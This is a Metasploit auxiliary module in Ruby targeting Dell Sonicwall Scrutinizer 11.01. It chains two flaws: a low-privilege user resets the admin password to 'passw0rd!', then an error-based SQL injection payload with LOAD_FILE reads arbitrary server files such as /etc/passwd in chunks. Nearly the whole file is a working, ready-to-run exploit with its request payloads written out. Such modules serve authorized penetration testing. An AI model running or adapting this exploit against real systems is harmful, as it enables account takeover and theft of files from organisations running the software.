# This module requires Metasploit: http//metasploit.com/download
##
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Dell Sonicwall Scrutinizer Authenticated Arbitrary User Password Change and File Read",
      'Description'    => %q{
      Dell Sonicwall Scrutinizer 11.01 is vulnerable to an arbitrary user password change vuln
      and a SQL injection as an admin user during account creation allows for the reading
      of arbitrary files.
 
      This module exploits both vulns to go from a user with lesser privileges to changing
      the admin user's password, then logging in as admin to exploit the SQLi and read
      an arbitrary specified file. Tested on a CentOS box, should work on windows as well.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [],
      'References'     => [],
      'Targets'        => [['Dell Sonicwall Scrutinizer 11.01', {}],],
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))
 
      register_options(
      [
          OptString.new('FILENAME', ['false', 'The file to read from the admin sqli', '/etc/passwd']),
          OptString.new('TARGETURI', [ true, "Base Application path", "/" ]),
          OptString.new('USERNAME', [ false,  "The username to authenticate as"]),
          OptString.new('PASSWORD', [ false,  "The password to authenticate with" ]),
          OptInt.new('USERID', [true, "The ID of the user to have their password changed. 'admin' is always 1.", 1])
      ], self.class)
  end
 
  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),
      'vars_get' => {
        'name' => datastore['USERNAME'],
        'pwd' => datastore['PASSWORD']
      }
    })
 
    res.body =~ /"userid":"(.*)","sessionid":"(.*)"/
    sessionid = $2
 
    cookie = "cookiesenabled=1; sessionid=#{sessionid}; userid=#{$1}"
 
    post = {
      'tool' => 'userprefs',
      'savePrefs' => datastore['USERID'],
      'othersTop' => 'true',
      'graphType' => 'step',
      'hostDisplayType' => 'DNS',
      'language' => 'english',
      'skin' => 'retro-sonicwall',
      'unit' => 'percent',
      'tab' => 'tab1',
      'defaultMap' => '0',
      'flowTopn' => '10',
      'statusOption' => 'conversations',
      'email' => 'undefined',
      'interval' => "1m",
      'ibOb' => 'inbound',
      'srcDst' => 'src',
      'alarmsTopn' => '50',
      'statusTopn' => '25',
      'statusRefresh' => '5',
      'statusViewDeflt' => 'topInterfaces',
      'defMailRep' => 'esoTopConversationsCount',
      'Timezone' => 'Automatic',
      'savePass' => 'passw0rd!',
      'useLdap' => '0',
      'defFlowalyzRep' => 'availability',
      'readonly' => '0'
    }
 
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri, '/cgi-bin/admin.cgi'),
      'method' => 'POST',
      'vars_post' => post,
      'cookie' => cookie
    })
 
    if res.code == 500
      fail_with("Error updating user's password. Check your credentials")
    end
 
    print_good ("Log in with the user's name and the password 'passw0rd!'")
 
    if datastore['USERID'] == 1 && datastore['FILENAME'] != ''
      print_good("Attempting to read file using 'admin' account: " + datastore['FILENAME'])
 
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),
        'vars_get' => {
          'name' => 'admin',
          'pwd' => 'passw0rd!'
        }
      })
 
      res.body =~ /"userid":"(.*)","sessionid":"(.*)"/
      sessionid = $2
 
      cookie = "cookiesenabled=1; sessionid=#{sessionid}; userid=#{$1}"
 
      hexstr = datastore['FILENAME'].bytes.map { |b| sprintf("%02x",b) }.join 
      i = 0
      file = ''
      while true
        post = {
          'tool' => 'userprefs',
          'newUser' => 'fdsafdsa',
          'pwd' => 'passw0rd!',
          'selectedUserGroup' => "2 AND (SELECT 3835 FROM(SELECT COUNT(*),CONCAT(0x716b6b7171,(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{hexstr})) AS CHAR),0x20)),#{(50*i)+1},50)),0x717a7a7571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        }
 
        res = send_request_cgi({
          'uri' => normalize_uri(target_uri, '/cgi-bin/admin.cgi'),
          'method' => 'POST',
          'vars_post' => post,
          'cookie' => cookie
        })
 
        res.body =~ /qkkqq(.*)qzzuq1/
        break if $1 == ''
        part = $1.scan(/(..)/).map{|a| a.first.to_i(16).chr}.join
        file << part
        i+=1
        print_good("#{i}. #{part}")
      end
 
      print_good(file)
    end
  end
end
